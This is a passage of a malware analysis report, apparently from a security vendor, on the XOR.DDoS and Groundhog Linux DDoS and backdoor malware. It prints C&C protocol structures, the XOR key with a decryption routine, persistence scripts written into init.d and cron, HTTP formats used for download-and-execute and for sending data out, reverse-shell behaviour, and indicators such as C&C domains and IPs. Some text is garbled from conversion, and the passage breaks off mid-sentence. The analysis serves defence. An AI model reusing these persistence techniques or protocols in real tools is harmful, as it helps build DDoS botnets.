This strange behavior\nconsisted of a large amount of peculiar files being written into sensitive system directories.\n\nA thorough analysis of the infected system by our Incident Response and Malware Research teams\nquickly revealed that the server was indeed compromised. The source of this compromise was\ntraced to an SSH brute force attack that took place earlier the same month. The attacking IP\naddresses originated from very distinctive network ranges mostly associated with Chinese Internet\nservice providers. Using this SSH brute-forcing network, it took the attackers only a few days to\ngain root access and full control of the targeted server. Once they obtained access to the server, the\nattackers infected the system with two malicious payloads.\n\nThese payloads were the _XOR.DDoS and_ _Groundhog malware variants, which are specifically_\ndesigned to infect Linux-based hosts and force them to participate in large DDoS (Distributed\nDenial of Service) attack campaigns.\n\nThe malware’s effectiveness indicates a major step-up in DDoS-related cybercrime capabilities.\n\nThe code proficiency, together with the fact that the malware infects only Linux servers with\npotential access to high bandwidth communication channels, may lead to DDoS attacks of as yet\nunseen proportions and persistency.\n\nWhile the XOR.DDoS malware was known and previously analyzed[1], the Groundhog payload has yet\nto be reported. Our investigation revealed a very strong connection between the two, as they use\nsimilar configuration, protection methods, and communication techniques.\n\nDeeper analysis of the samples leads us to conclude that they are, with a high probability, different\nmodules of the same malware family, and that they were designed and created by the same actor.\n\nOur research data shows the attackers had recently switched the networks used for the initial brute\nforce attacks, possibly due to detection and prevention measures taken in recent months.\n\nThis report summarizes our research efforts. We provide a detailed description of the entire\ncampaign including observed infection methods, malware techniques and payload analysis.\n\n1 http://blog.malwaremustdie.org/2014/09/mmd-0028-2014-fuzzy-reversing-new-china.html\n\n\n-----\n\n##### XOR.DDoS and Groundhog \n\n## “\n\n##### are, with a high probability, \n\n different modules of the same\n\n malware family, and were \n\n created by the same actor\n\n# ”\n\n\n-----\n\n###### CAMPAIGN OVERVIEW\n\nIn the past few years a new cyber security threat has emerged. Many major organizations have fallen victim to large scale DDoS\nattacks. As the name implies, these attacks are distributed, so it appears difficult at first to trace their origins.\n\nA more careful inspection of this threat reveals that the hosts issuing the attack were themselves compromised and unwillingly\nrecruited to conduct a DDoS campaign.\n\nThis fact is a game changer from a threat intelligence perspective. This means that in order to find the attack origins, the forensics\ninvestigation must be focused on the attacking hosts rather than the targets.\n\nThere are already reports of several malware using this method. They infect hosts and harvest a huge DDoS botnet for later use in\nattacking targets given its operators command.\n\nEach of these malware has its own characteristics and usually focuses on a specific type of target. The overall target range is\nimpressive, running the gamut from home-based computers to residential network routers, and also include commercial servers.\n\nAnother interesting fact is that each of the posted research reports regarding these types of malware seems to point to China as the\norigin of the attack.\n\nA few months ago, Check Point’s Incident Report team was contacted by a customer who claimed to be infected with one of these\nmalware variants.\n\nThis report is the outcome of the research that followed. It explains in detail the technical and intelligence perspectives behind the\nmalware we detected, which is named XOR.DDoS.\n\nWe also reveal an as yet unreported module of this malware named Groundhog.\n\n**METHOD OF INFECTION**\nThe XOR.DDoS malware has been previously reported[2] on several occasions. Some of the earlier reports which describe the XOR.\n_DDoS malware have mentioned its targets were initially attacked with attempts to brute force an SSH service password._\n\nTherefore, our investigation started by examining the attacked server’s SSH logs. We quickly realized that our case was no different\nthan the previously reported ones, and that the compromised server logs showed a very incriminating SSH login behavior that took\nplace in the last few weeks prior to our investigation.\n\nEarly reports mentioned that the SSH brute force attack originates in a netblock assigned to the Chinese-based HEE THAI LIMITED\n_(AS63854). A later report[3], from April 2015, mentioned removing all routing capabilities from this netblock in an attempt to interfere_\nwith the botnet offensive capabilities.\n\n_Figure 1 - A non-routable message taken from the HURRICANE ELECTRIC web service._\n\n2 https://www.fireeye.com/blog/threat-research/2015/02/anatomy of a brutef.html\n\n\n-----\n\nOur current investigation shows the attackers have managed to adapt and have successfully shifted their botnet traffic to a new\nnetblock assigned to CHINANET Jiangsu province backbone (AS23650).\n\nForensic analysis of an infected server revealed the behavior pattern in one of these attacks:\n\n###### FAILED SSH LOGIN ATTEMPTS\n\n\n60,000\n\n50,000\n\n40,000\n\n30,000\n\n20,000\n\n10,000\n\n0\n\n\n1   4   7   10   13   16   19   22   25   28   31   34   37   40   43   46  49\n\n###### LOG DAY\n\n\n_Table 1- Failed SSH Logins from a compromised server._\n\nThe failed SSH login data in Table-1 shows an SSH brute force attack that dates back to the beginning of the log file. The attack\npeaked on day 6 and ended on approximately day 28.\n\n\nWe stated earlier that we managed to identify two payload types dropped in the system. Interestingly, they were dropped on different\noccasions; the files relating to the first XOR.DDoS payload were created on day 12, and the files relating to the second Groundhog\npayload were created on day 36.\n\nThis information leads us to believe that the attackers were able to brute-force the root account password on or before day 12,\nand this was indeed the original method of infection.\n\n**CAMPAIGN TARGETS**\nInformation gathered from Check Point ThreatCloud statistics reveals that this was not a single case of infection but rather an\norchestrated widespread campaign.\n\n\nWhile we acknowledge that our visualization of the campaign’s targets is imperfect, these statistics are sufficient to reveal that\nthis is a global campaign targeting servers from several continents.\n\n\n-----\n\n**INFECTION DETAILS**\n\nThe server infection consisted of two major payloads. The following sections provide an overall description of their main purpose and\nmethods of operation.\n\n**XOR.DDoS**\n_XOR.DDoS is a malware which targets Linux-based operating systems. Its main executable file is an ELF binary._\n\nThis malware is mainly used to issue Denial-Of-Service (DoS) attacks according to the configuration sent by the C&C server. Any of\nthese methods can be used: SYN Flood, ACK Flood and DNS amplification attacks.\n\nAdditionally, the XOR.DDoS malware has an option to send system information to the C&C server and to download and execute any\narbitrary file from there.\n\nAs the malware runs with root permissions, this effectively widens the malware capabilities to obtain unlimited control over the\ninfected server.\n\nThe C&C communication occurs via a custom binary protocol. The C&C messages data section is encrypted using a simple XOR\ncipher (the reason why the malware is commonly referred to as ‘XOR.DDoS’).\n\n###### M1 M2 M3 M4 M5 M6 M7 M8 M9 MESSAGE\n\n K1 K2 K3 K4 K1 K2 K3 K4 K1 ENCRYPTED KEY\n\n E1 E2 E3 E4 E5 E6 E7 E8 E9 ENCRYPTED MSG\n\n_Table 2 - An illustration of the encryption mechanism._\n\nSeveral advanced persistence and stealth techniques are utilized to assure operational continuity and prevent detection. These\nmethods include an attempt to terminate common “competitive” malware variants as well as usage of Loadable Kernel Module[4] and\nRing-0 code execution.\n\n**Groundhog**\nThe Groundhog malware also targets Linux-based operating systems and uses an ELF binary as its main executable file.\n\nThe attackers appear to use Groundhog to maintain persistent access to the infected server. Most of the malware’s functionality is\nrelated to maintaining and updating the configuration, spawning new infection threads and files, and providing reverse shell abilities\nto manually control the server as needed.\n\nThe C&C communication occurs via a custom binary protocol and can use several common TCP ports such as 22, 80, 443 and others.\n\n4 The Loadable Kernel Module functionality does exist in the code but was disabled in all of the analyzed samples\n\n\n-----\n\n**Points of Similarity**\nThe Groundhog and XOR.DDoS malware samples share a number of common features and aspects. This leads us to believe that these\nmalware binaries are tightly coupled and perhaps were even designed as 2 modules of the same malware campaign, or written by the\nsame author.\n\nThe table below lists the most noticeable similarities between these two malware:\n\n**Feature** **Description**\n\nConfiguration Similar configuration files, which may contain duplicated data.\n\nCommunication The same User-Agent values are used in communications with the C&C servers.\nSimilar communication channels are used.\n\nSystem Info Algorithms The same routines for system information gathering routines are used.\n\nShared Routines Several of the embedded routines within the malware code share the same properties and\nappear to have been written by the same author.\n\n_Table 3 - Groundhog and XOR.DDoS Similarities._\n\n|Feature|Description|\n|---|---|\n|Configuration|Similar configuration files, which may contain duplicated data.|\n|Communication|The same User-Agent values are used in communications with the C&C servers. Similar communication channels are used.|\n|System Info Algorithms|The same routines for system information gathering routines are used.|\n|Shared Routines|Several of the embedded routines within the malware code share the same properties and appear to have been written by the same author.|\n\n\n-----\n\n##### Several advanced persistence \n\n## “\n\n##### and stealth techniques are \n\n utilized to assure operational \n\n continuity and prevent \n\n detection\n\n# ”\n\n\n-----\n\n###### XOR.DDOS ANALYSIS\n\n**OVERVIEW**\nThe XOR.DDoS is an ELF 32 bit GNU/Linux statically compiled binary. As a DDoS bot, it is able to perform various Denial-of-Service\nattacks on the specified servers.\n\nThe malware has two hardcoded addresses which are used as the C&C server addresses. The malware can also download additional\nmodules, collect information about the system state, and perform tasks for killing processes.\n\n**COMMUNICATION**\n**Protocols and Message Structures**\nXOR.DDoS C&C communication uses a custom binary protocol. This table describes the structure of each C&C communication packet:\n\n```\nstruct cc_hdr {\n  int32_t crc_checksum; // checksum of header\n  int32_t command_len; // length of optional data\n  int32_t command_code; // command code, accepted [0, 9]\n  int32_t tasks_no;  // number of DDoS tasks\n  int32_t requests_no;  // number of requests per task\n  int32_t src_ip_lo; // DNS attack destination IP lower bound\n  int32_t src_ip_hi; // DNS attack destination IP upper bound\n};\nstruct cc_packet {\n  struct cc_hdr cc_hdr;\n  char optional_data[0];\n};\n\n```\n\nThe message header described above is self-explanatory. Several fields are used only by specific C&C server commands (such as\n```\ntask_no, requests_no). These commands are further explained in the relevant command description.\n\n```\nThe message body is composed of command-specific content. The data in this section is encrypted using a simple XOR cipher using the\nstring ‘BB2FA36AAA9541F0’ as a static key.\n\n```\nkey = [0x42, 0x42, 0x32, 0x46, 0x41, 0x33, 0x36, 0x41, 0x41, 0x41, 0x39,\n0x35, 0x34, 0x31, 0x46, 0x30]\ndef dec_conf(data):\n rv = [ord(x) for x in data]\n for i, b in enumerate(rv):\n  b1 = b ^ key[i % len(key)]\n  rv[i] = chr(b1)\n return rv\n\n```\n\n-----\n\nThe entire C&C communication occurs via HTTP protocol using TCP/3053 or TCP/6001.\n\nThe malware sends an HTTP request packet to the C&C server and waits for a response. Once the C&C response is received,\nthe malware parses the HTTP response packet using the “\\r\\n\\r\\n” delimiter.\n\nNote: The malware does not check the HTTP response code and parses the response regardless.\n\n**C&C COMMANDS**\nThe C&C protocol contains a field called ‘command_code.’ This field indicates the C&C command type and affects the malware\nbehavior.\n\nThis table describes all the possible commands:\n\n**Command ID** **Description** **Details**\n\n0    - Do nothing.\n\n1    - Do nothing.\n\n2 STOP Stop DoS attack.\n\n3 Start DoS Attack Start DoS attack using the configuration data received in the packet.\n\n4    - Do nothing.\n\n5    - Do nothing.\n\n6 Download & Execute Download and execute a file from the specified URL.\n\n7 Download & Execute II Download and execute a file from the specified URL. This is how the malware\nreceives updates.\n\n8 Send System Information Collect information about the system state and send it to the specified URL.\n\n9 Update Configuration Receive new configuration data, which is used to kill processes.\n\nThe following sections provide a full description of the specific C&C commands.\n\n**_[3] Start DoS Attack_**\nWhen this command is issued, the C&C sever uses the ${optional_data} data field to send configuration data for a DDoS attack.\n\nThe number of DDoS configurations is specified in the ${tasks_no} field. An example of a task structure is represented below:\n\n|Command ID|Description|Details|\n|---|---|---|\n|0|-|Do nothing.|\n|1|-|Do nothing.|\n|2|STOP|Stop DoS attack.|\n|3|Start DoS Attack|Start DoS attack using the configuration data received in the packet.|\n|4|-|Do nothing.|\n|5|-|Do nothing.|\n|6|Download & Execute|Download and execute a file from the specified URL.|\n|7|Download & Execute II|Download and execute a file from the specified URL. This is how the malware receives updates.|\n|8|Send System Information|Collect information about the system state and send it to the specified URL.|\n|9|Update Configuration|Receive new configuration data, which is used to kill processes.|\n\n```\nenum DDOS_TYPE {\n   DDOS_TYPE_DNS = 0x4,\n   DDOS_TYPE_SYN = 0x5,\n   DDOS_TYPE_ACK = 0xA\n};\nstruct DDOS_CNCCONFIG {\n   int32_t ip_addr; // The target IP address in network form (in the event of a\n                // SYN/ACK attack), or the DNS IP address in network form.\n   int16_t port; // Port used to connect to an IP address.\n\n```\n`char dns_query[258];` // Query for DNS Amplification attack.\n```\n   DDOS_TYPE attack_type;// Type of attack: DDOS_TYPE_*.\n\n```\n// If the flag is not set, the current connected address is used as the source\n```\n                IP address\n\n```\n// to send packets. If the flag is set, an IP address is chosen via mathematical\n```\n                // operation to connect between ${src_ip_lo} and ${src_ip_hi} and used as the\n                // source IP address.\nint32_t npass_self_ip_as_src;\nint32_t size;  //Unknown\n};\n\n```\n\n-----\n\nTo initiate a DoS attack, the malware creates a number of threads equal to the number of cores on the infected machine multiplied by\n2. Each thread sends 65535 packets (the type of packet is set by the configuration data).\n\nFewer packets are sent if a STOP command is received from the C&C server.\n\nThese types of DoS attack types are supported:\n\n- SYN flood\n\n- ACK flood\n\n- DNS amplification\n\n**_[6] Download & Execute_**\nWhen this command is issued, the C&C sever uses the ${optional_data} data field to send a URL in this format:\n\n\n(http://)?${hostname}(:${port})?/${resource}(!${filename})?\n\n\nThe malware then sends the above HTTP request using port 80 (if no other port is specified) and receives as response the binary file to\nbe executed.\n\n```\nGET /${resource} HTTP/1.1\nAccept: */*\nAccept-Language: zh-cn\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; TencentTraveler ; .NET CLR\n1.1.4322)\nHost: ${host}\nConnection: Keep-Alive\n\n```\n\nIf it was specified, the filename field is used as the name of the file. If the filename was not specified, the malware uses the name\n```\n‘/tmp/${resource}’.\n\n```\nThe HTTP packet data content is used as the content of a newly created file. The file is then saved and executed.\n\n**_[7] Download & Execute II_**\nThe malware performs the same operations as in [6] Download & Execute. The only difference is that the newly created file is executed\nwith this parameter:\n\n\n${created_file} ${caller_process_pid}\n\n\n-----\n\n**_[8] Send System Information_**\nThis command is used to signal the malware to collect and send system information.\n\nIn this case, the C&C sever uses the ${optional_data} data field to send the destination URL used to send the collected system\ninformation.\n\nThe malware collects system information using the routine described in Appendix A—System Information Collection Routine.\n\nThe malware stores all collected information in self-implemented linked lists. The structures used to represent connection and\nprocess information are shown below:\n\n```\nstruct tcp_conn_info {\n    int32_t pid;     // PID of process that possess connection\n    int32_t port_local;  // number of locally opened port\n    int32_t addr_remote;  // remote IP address\n    int32_t port_remote;  // number of remotely opened port\n    int32_t proc_path[0x1000];  // path to executable\n    int32_t conn_inode;  // connection inode\n    struct tcp_conn_info *ptcpci; // pointer to the next entry in list\n};\n\n```\n```\nstruct proc_info {\n    int32_t pid;  // process PID\n\n```\nint32_t file_checksum; // checksum of file content\n```\n    char proc_path[0x1000];  // path to executable\n};\n\n```\n\nThe malware generates network connections information using this format:\n\n```\n\"%d--%s_%d:%s|\" % (port_local, addr_remote, port_remote, proc_path)\n\n```\n\nNext, processes list are generated for the information using this format:\n\n\n\"%u:%s|\" % (file_checksum, proc_path)\n\n\nFinally, the information is concatenated using this format:\n\n```\ninfo=${proc_info}${conn_info}\n\n```\n\nThe info variable is sent as data in this HTTP packet:\n\n```\nPOST /${resource} HTTP/1.1\nAccept: */*\nAccept-Language: zh-cn\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; TencentTraveler ; .NET CLR\n1.1.4322)\nHost: ${hostname}\nContent-Type: application/x-www-form-urlencoded\nContent-Length: #${info}\nConnection: Keep-Alive\n${info}\n\n```\n\n-----\n\nThis command is used to signal the malware to collect new configuration.\n\nIn this case, the C&C sever uses the ${optional_data} data field to send a source URL used to fetch the configuration data.\n\nThe following HTTP request is then sent by the malware:\n\n```\nGET /{resource} HTTP/1.1\nAccept: */*\nAccept-Language: zh-cn\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; TencentTraveler ; .NET CLR\n1.1.4322)\nHost: ${host}\nConnection: Keep-Alive\n\n```\n\nAny existing configuration is discarded and replaced by the newly received configuration.\n\n**PERSISTENCY**\nSeveral actions are taken by the malware to achieve persistency across system reboots and ensure its operational continuity.\n\nThe following script is created in the /etc/init.d folder, which serves as the auto start folder on GNU/Linux systems:\n\n```\n#!/bin/sh\n# chkconfig: 12345 90 90\n# description: ${filename}\n### BEGIN INIT INFO\n\n```\n`# Provides:` ${filename}\n```\n# Required-Start:\n# Required-Stop:\n# Default-Start: 1 2 3 4 5\n# Default-Stop:\n\n```\n`# Short-Description:` ${filename}\n```\n### END INIT INFO\ncase $1 in\nstart)\n ${path_to_malware}\n ;;\nstop)\n ;;\n*)\n ${path_to_malware}\n   ;;\nesac\n\n```\n\nA second script is created as ‘/etc/cron.hourly/gcc.sh’ and is used to check for the presence of the malware in the system.\nThis script file serves as a cron job that will be started every hour.\n\n```\n#!/bin/sh\nPATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/X11R6/bin\n\n```\n`for i in `cat /proc/net/dev|grep :|awk -F: {'print $1'}`; do` ifconfig $i up& done\n```\ncp /lib/libudev.so /lib/libudev.so.6\n/lib/libudev.so.6\nsed -i '/\\/etc\\/cron.hourly\\/gcc.sh/d' /etc/crontab && echo '*/3 * * * * root /etc/cron.hourly/gcc.\nsh' >> /etc/crontab\n\n```\n\n-----\n\nThis script is also responsible for enabling all network interfaces and for executing the malware file (previously copied to this directory):\n\n```\n/lib/libudev.so\n\n```\n\nOld startup files are unlinked from these directories and new files containing symbolic links to the new auto start file are created:\n\n\n/etc/rc[1-5].d/S90${filename} ---> /etc/init.d/${filename}\n\n/etc/rc.d/rc[1-5].d/S90${filename} ---> /etc/init.d/${filename}\n\n\nNew services are created for management and to install SysV style init scripts:\n\n\nchkconfig –add ${filename}\n\nupdate-rc.d ${filename} defaults\n\n\n**MALWARE OPERATION**\n**Main Threads**\nThe XOR.DDoS malware creates the following threads:\n\n**_THREAD 1 - GET_KILL_CFG THREAD_**\nThis thread is used to retrieve an updated configuration file which contains a list of processes and IP addresses attributed to competitive malware variants.\n\nOnce the information is retrieved, these processes are killed by the malware.\n\nThe following operations are performed to enable this functionality:\n\n- IP addresses of decrypted C&C domains are resolved either manually or by using a standard API.\n\n- HTTP request is sent to the resolved IP address via port 80:\n\n```\nGET /dd.rar HTTP/1.1\nAccept: */*\nAccept-Language: zh-cn\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; TencentTraveler ; .NET CLR\n1.1.4322)\nHost: ${host}\nConnection: Keep-Alive\n\n```\n\n\n- The malware decrypts the received data with the routine shown in Protocols and Message Structures.\n\n- The decrypted data is used as a new killing processes configuration.\n\n- Sleeps for 30 minutes.\n\n**_THREAD 2 - CC_COMM THREAD_**\nThis thread tries to get the ${MAGIC_STR} value from this file:\n\n```\n/var/run/gcc.pid\n\n```\n\n-----\n\nIf the file does not exist or the file size is not equal to 0x20 bytes, a random string with that length is generated and saved to a specified\nfile. The same value is used as a ${MAGIC_STR} value.\n\nThe malware performs the following operations in an infinite loop:\n\n- Uses a list of hardcoded domains and port numbers to communicate with C&C server.\n\n- Gets self IP address.\n\n- Collects the following system information:\n\n```\nstruct pc_info {\n    int32_t mem_info;  // amount of memory in Mb\n    int32_t lan_speed;  // speed of LAN connection\n    int32_t is_lkm_present;  // is LKM present in the system\n    char os_release[65];  // OS release version\n\n```\n`char hardware_id[65];` // Hardware identifier\n```\n    char processor_info[65];  // number of cores * MHz per core\n    char magic_str[33];  // MAGIC_STR\n    char unknown[16];  // 'STATIC' in analyzed sample\n    char mal_ver[16];  // Malware version???\n};\n\n```\n\n\n- Encrypts the above structure using the routine shown in Protocols and Message Structures. The malware then creates a cc_hdr\nstructure and sends the header and encrypted structure to the C&C server.\n\n- Waits for response from the C&C server. If the checksum of the header is correct, the malware continues execution. If not,\nconnection with the C&C server is closed and the communication loop starts from the beginning.\n\n- To check for the possibility of IP address spoofing, the malware generates many IP addresses using its IP address as a seed.\n\n- These IP addresses are used in the “source_ip” field in the UDP packets that are sent to the C&C server. Each packet also\ncontains the ${MAGIC_STR} value. The generated IP addresses may be used for DNS amplification or SYN flood attacks to avoid\nblocking of IP addresses or IP address ranges for the target. The algorithm for IP address generation can be found in Appendix\n_B—UDP Packet’s Source IP Generation Algorithm._\n\n- The malware waits for the cc_hdr one more time and checks if the checksum is valid. If it is valid, the malware passes the\nexecution flow to the routine that is responsible for receiving and parsing the command packet.\n\n**Operation Modes**\n_XOR.DDoS has 3 possible operation modes. The operation mode is decided according to the input arguments set when executing the_\nmain binary file.\n\nThe table below describes the possible execution modes:\n\n|Execution Mode|Number of input args|Arguments|Description|\n|---|---|---|---|\n|Update Process|2|${pid}|Update the process routine.|\n|Name Spoofing & Process Replication|3|${bash_cmd} ${pid}|Replace the name with ${pid} and remove the process.|\n|Initial execution|otherwise|...|Installation and Execution process.|\n\n\n-----\n\nThe following sections provide a detailed description of these execution modes.\n\n**_Update Process Mode_**\nThis mode is used to kill the current process instance, clone to a new process, and execute.\n\nWhile executing this routine, the malware performs the following tasks:\n\n- Clears the process name and the argument that was passed, so the GNU/Linux utility (for example, ps) is not able to show the\nCOMMAND string.\n\n- Gets the full path to the specified PID process using this symlink:\n\n```\n/proc/${pid}/exe\n\n```\n\n\n- Removes the file using the found path. Removes all files from these auto start directories:\n\n\n/etc/init.d/${filename}\n\n/etc/rc[1-5].d/S90${filename}\n\n\n\n- Executes the commands to update the auto start services:\n\n\nchkconfig --del ${filename}\n\nupdate-rc.d ${filename} remove\n\n\n\n- Kills process with the specified PID and then clones itself with empty arguments.\n\n**Name Spoofing & Process Replication Mode**\nThis mode is used to spoof the malware process name in the system.\n\nThe XOR.DDoS malware achieves this by performing the following tasks:\n\n- Send a request to the LKM (see Loadable Kernel Module) to hide the current process PID.\n\n- Read the content of its own image file.\n\n- Clear all arguments passed to the application.\n\n- Use the ${bash_cmd} argument that was passed as the new process name.\n\n- For the next 5 seconds, perform these operations:\n\n   - Attempt to resolve the full path to the process with ${pid} using the ‘readlink’ function. If the real path to the file contains\nmore than 0 symbols, it “sleeps” for 1 second. This appears to be simply a replication technique, as after 5 seconds the malware\nsends a request to the LKM (see Loadable Kernel Module) to unhide the current process’ PID and remove itself from the system.\n\n   - If the ‘readlink’ function failed, it tries to perform the “all services delete” operation related to the ${pid} (see Update\nProcess for a full description).\n\nThe malware attempts to get the abstract filename by searching for the “/” symbol. As the buffer contains only ‘0x00’ (‘readlink’ failed)\nbytes, the process will read “out of bound memory” and will probably fail, due to the SIGSEGV signal.\n\n- The malware tries to copy the ‘/lib/libudev.so’ file under a random name to one of these folders:\n\n```\n/usr/bin/\n/bin/\n/tmp/\n\n```\n\n-----\n\nIf `/lib/libudev.so does not exist, the malware uses the previously read content as content for a new file. The malware also adds`\nrandom bytes at the end of the file.\n\nAfter the operations have been performed, the malware executes the newly created file without parameters.\n\nThe malware sends a request to the LKM (see Loadable Kernel Module) to unhide its own PID and the PID received in arguments. It\nthen removes itself from the hard drive.\n\nThe ${pid} process is killed as described in Update Process Mode.\n\n**_Initial Execution Mode_**\nThis is the main mode used to install the malware and enable all of its features on the system.\n\nThe following is a description of the tasks performed by the malware while this mode is selected:\n\n(It should be noted that this behavior contains bugs, and does not always operate as expected in the samples we have analyzed.)\n\n- The malware switches to the daemon mode.\n\n- Full self-path is taken and compared with these directories:\n\n```\n/usr/bin/\n/bin/\n/tmp/\n\n```\n\nIf the path to the file does not contain the specified paths, the malware verifies that these folders exist:\n\n```\n/usr/bin/\n/bin/\n/tmp/\n/lib/\n/var/run/\n\n```\n\n\n- Next, the malware tries to copy itself to this file:\n\n```\n/lib/libudev.so\n\n```\n\n\n- After these operations are performed, the malware tries to copy itself to one of the following folders, under a random filename:\n\n```\n/usr/bin/\n/bin/\n/tmp/\n\n```\n\n\n- A random 10-letter string and a 0x00 byte are appended to the end of the file content to prevent detection by any hash based\nmechanisms.\n\n- The malware executes the copied file without arguments, removes its own executable file from the hard drive, and finishes the\nprocess execution.\n\nAs the newly executed process contains specified directories in the self-path, the malware tries to create or open a shared memory\nobject using the following key ID:\n\n```\n0xDA718716\n\n```\n\n-----\n\n- The malware takes a value consisting of 4 bytes from the shared memory object. This value is treated as a PID of another\nmalware process instance.\n\n- If a process with a PID matching the extracted value is currently running in the system, the malware removes its own executable\nfile from the hard drive and finishes the process execution. Otherwise, the malware writes its own PID to the shared memory.\nThis technique is used to avoid running more than one instance of malware at the same time and it is similar to a global “Mutex”\nusage in Windows operating systems.\n\n- The malware has the possibility of installing the LKM[5] (See Loadable Kernel Module) on the infected system using the “insmod”\nGNU/Linux command.\n\n- It uses a buffer embedded in its binary containing the LKM code, writes it to the /usr/bin folder using a random filename, and\nremoves the file after the LKM has been loaded to kernel space.\n\n- The malware creates all persistence related files and prepares all required tasks as described in the Persistency section.\n\n- Next, the C&C addresses and ports are decrypted using the method described in Protocols and Message Structures.\n\n- To hide the communication port number and the current PID, a request is sent to the LKM (see Loadable Kernel Module).\n\n- The malware then starts its three main threads.\n\nAfter thread creation, the malware starts an infinite loop that performs the following operations:\n\n- Copy the content of ‘/lib/libudev.so’ to one of these folders and adds random letters to the end of the newly created file:\n\n```\n/usr/bin/\n/bin/\n/tmp/\n\n```\n\n\n- Take one entry from the decrypted strings (in the case of the /tmp folder, it always takes “cat resolv.conf”):\n\n```\ncat resolv.conf\nsh\nbash\nsu\nps -eF\nls\nls -la\ntop\nnetstat -an\nnetstat -antop\ngrep \"A\"\nsleep 1\ncd /etc\n\n```\necho \"find\"\n\nifconfig eth0\n\nifconfig\n```\nroute -n\ngnome-terminal\nid\nwho\nwhoami\npwd\nuptime\n\n```\n\n5 While the LKM functionality is embedded into the binary we have not seen any samples actually using the LKM functionality\n\n\n-----\n\nThe malware executes the newly created file with these arguments, and effectively activates the Name Spoofing & Process\nReplication Mode.\n\n\n${path_to_file} ${random_string} ${PID}\n\n\nThese operations are executed 5 times, after which the created files are removed and the malware performs all operations from the\nbeginning.\n\n**LOADABLE KERNEL MODULE**\nLKM uses the following device to receive commands from the user space malware:\n\n```\n/proc/rs_dev\n\n```\n\nWhile analyzing the user space malware, we found the following commands:\n\n**Request** **Type** **Value** **Description**\n\n0x9748712 0 0 Check if LKM is present.\n\n0x9748712 1 ${pid} Hide PID.\n\n0x9748712 2 ${pid} Unhide PID.\n\n0x9748712 3 ${port} Hide port.\n\nNote: The user space malware tries to change ownership of some of the created files if the LKM is present in the system. It uses the\nfollowing ${uid}:${gid} configuration:\n\n|Request|Type|Value|Description|\n|---|---|---|---|\n|0x9748712|0|0|Check if LKM is present.|\n|0x9748712|1|${pid}|Hide PID.|\n|0x9748712|2|${pid}|Unhide PID.|\n|0x9748712|3|${port}|Hide port.|\n\n```\n0xAD1473B8:0xAD1473B8\n\n```\n\n###### GROUNDHOG ANALYSIS\n\n**OVERVIEW**\n_Groundhog is an ELF 32 bit GNU/Linux statically compiled binary that acts like a backdoor on an infected system._\n\nThe malware uses the predefined domain GroUndHog[.]MapSnode[.]CoM (which is how the malware got its name) and IP\naddress to communicate with the C&C server. It has the ability to download additional modules, and perform remote code execution\nvia reverse shell and specified processes killing.\n\n**COMMUNICATION**\nThe malware tries to resolve this domain to communicate with the C&C server:\n\n```\nGroUndHog.MapSnode.CoM\n\n```\n\nThese DNS servers are used to obtain the domain IP addresses:\n\n```\n8.8.8.8 (Google’s DNS)\n8.8.4.4 (Google’s DNS)\n208.67.222.222 (OpenDNS’s DNS)\n208.67.220.220 (OpenDNS’s DNS)\n\n```\n\n-----\n\nIf the domain was resolved successfully, the malware uses the received address as an IP address for the C&C server. If domain\nresolution failed, the hardcoded IP address shown below is used:\n\n```\n211.110.1.32\n\n```\n\nThe malware tries to establish a connection in the following ports:\n\n```\n22\n53\n80\n443\n1433\n1521\n3306\n\n```\n\nWhile using live communication with the C&C server, connection was established only with port 80.\n\n**Protocols and Message Structures**\nThe C&C uses a binary protocol to communicate with the infected machine. The structure of each packet is shown below:\n\n```\nstruct command {\n    int32_t id; // command ID\n    int32_t packed_len; // Length in bytes of whole packet\n    char packed_data[0];  // Data\n};\n\n```\n\n_Figure 4 - Groundhog C&C message structure_\n\n\n-----\n\n**C&C COMMANDS**\n_Groundhog bots can receive any of multiple commands from the C&C server:_\n\n**Command id** **Function Name** **Detail**\n\n0 UPDATE_CONF Unpack & decrypt received data. The data is used for the “kill & collect information” task.\n\n1 - Sleep for the amount of seconds set by the C&C server (the default is 10 seconds).\n\n2 DWN_FILE_C Unpack & decrypt received data. The data should be in a valid URL format.\n\n3 DWN_FILE_P Unpack & decrypt received data.

This URL is used to download data.\n\nThe URL has this format:\n\n```\nhttp://${host}(:${port})?(/${resource})?\n\n```\n\nIf the port is not specified in the URL string, the malware uses port 80 by default.\n\nThe malware creates the following HTTP request and sends it to the specified domain:\n\n```\nGET /${resource} HTTP:/1.0\nAccept:*/*\nAccept-Language: zh-cn\nUA-CPU: ${architecture}\nUser-Agent: Mozilla/4.0(compatible; MSIE 6.0; Windows NT 5.2; SV1; TencentTraveler ;.NET CLR\n1.1.4322)\nHost: ${host} \nConnection: Keep-Alive\n\n```\n\nThe response from the server is parsed only if the HTTP response code is “OK” or “Partial Content.” The “Content-Length”\nfield is used to get the packet content size.\n\nThe malware generates a random filename and tries to save the file in one of the following folders:\n\n```\n/bin/\n/sbin/\n/usr/\n/usr/bin/\n/boot/\n/tmp/\n\n```\n\nThe content of this file is taken from the HTTP packet data.\n\nAfter performing the above operations, the malware executes the newly created file, first changing its mode to “0755”.\n\n**_[3] DWN_File_P_**\nThe only difference between the DWN_FILE_C and DWN_FILE_P commands is that the data received from the specified domain is\nencrypted in the DWN_FILE_P command.\n\n**_[9] NEW_CONN_**\nThis command receives two integers as input arguments. The first integer specifies the IP address in network form. The second\ninteger specifies the port for the IP address. If the configuration sent by the C&C is correct, the malware tries to connect to the\nspecified IP address using the port in SEND_MODE_INFO mode.\n\nAfter finishing all operations, the malware reverts back to the state it was in before the connection to the received IP address.\n\nThe C&C server can specify more than one IP address, using “\\r\\n” to separate between the addresses.\n\n\n-----\n\n**_[10] REV_SHELL_**\nThe REV_SHELL command is used by the client to initiate a reverse shell session.\n\nThe main communication loop starts a new thread that is responsible for creating a reverse shell with the C&C server. One of the\nfollowing shells is used:\n\n```\n/bin/bash\n/bin/sh\n\n```\n\nThe malware then starts a service thread that is responsible for sending commands to the shell process as well as receiving results\nfrom the shell process.\n\nNext, a thread responsible for reading data from the established connection with the C&C server is started. It passes received\ncommands to the service thread, waits for a response, and sends data back to the C&C. If the C&C server sends the “exit”\ncommand, the bash is closed and the malware continues the main communication loop execution.\n\n**_[12] NEW_FILE_**\nThe NEW_FILE command is used 